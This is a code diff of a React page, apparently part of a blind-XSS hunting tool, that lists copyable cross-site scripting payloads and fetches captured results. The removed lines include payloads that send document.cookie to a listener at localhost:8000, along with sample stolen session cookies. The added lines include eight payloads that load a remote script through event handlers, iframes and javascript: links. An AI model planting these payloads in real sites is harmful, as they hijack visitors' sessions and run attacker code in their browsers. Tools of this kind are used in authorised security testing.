@@ -3,26 +3,18 @@ import PageNav from "./../components/PageNav";
 import styles from "./BlindXssResults.module.css";
 
 const BlindXssResults = () => {
-  const [results, setResults] = useState([
-    {
-      timestamp: "2024-06-12T12:34:56Z",
-      ip: "192.168.0.1",
-      cookie: "sessionid=abc123; csrftoken=xyz789",
-    },
-    {
-      timestamp: "2024-06-12T13:45:23Z",
-      ip: "192.168.0.2",
-      cookie: "sessionid=def456; csrftoken=uvw123",
-    },
-  ]);
-
+  const [results, setResults] = useState([]);
   const [payloadCopied, setPayloadCopied] = useState(false);
 
   const payloads = [
-    "<script src='http://localhost:8000/blind-xss.js'></script>",
-    "<img src=x onerror='document.location=`http://localhost:8000/xss-listener?cookie=${document.cookie}`'>",
-    "<iframe src='http://localhost:8000/blind-xss.js'></iframe>",
-    "<svg/onload=fetch('http://localhost:8000/xss-listener?cookie='+document.cookie)>",
+    "<script src='http://localhost:8000/bxss.js'></script>",
+    "<img src='x' onerror=\"var s=document.createElement('script');s.src='http://localhost:8000/bxss.js';document.body.appendChild(s);\">",
+    "<svg/onload=\"fetch('http://localhost:8000/bxss.js')\">",
+    "<iframe src='http://localhost:8000/bxss.js'></iframe>",
+    "<body onload=\"fetch('http://localhost:8000/bxss.js')\">",
+    "<a href=\"javascript:fetch('http://localhost:8000/bxss.js')\">Click me</a>",
+    "<input type='image' src='x' onerror=\"var s=document.createElement('script');s.src='http://localhost:8000/bxss.js';document.body.appendChild(s);\">",
+    "<form action='http://localhost:8000/bxss.js'><input type='submit'></form>",
   ];
 
   const copyToClipboard = (payload) => {
@@ -37,11 +29,20 @@ const BlindXssResults = () => {
   };
 
   useEffect(() => {
-    // Uncomment the fetch call when ready to fetch from server
-    // fetch("http://localhost:3000/xss-results")
-    //   .then((response) => response.json())
-    //   .then((data) => setResults(data))
-    //   .catch((error) => console.error("Error fetching XSS results:", error));
+    const fetchResults = async () => {
+      try {
+        const userId = localStorage.getItem("userId");
+        const response = await fetch(
+          `http://localhost:8000/api/bxsshunter/xss-results?userId=${userId}`
+        );
+        const data = await response.json();
+        setResults(data);
+      } catch (error) {
+        console.error("Error fetching XSS results:", error);
+      }
+    };
+
+    fetchResults();
   }, []);
 
   return (
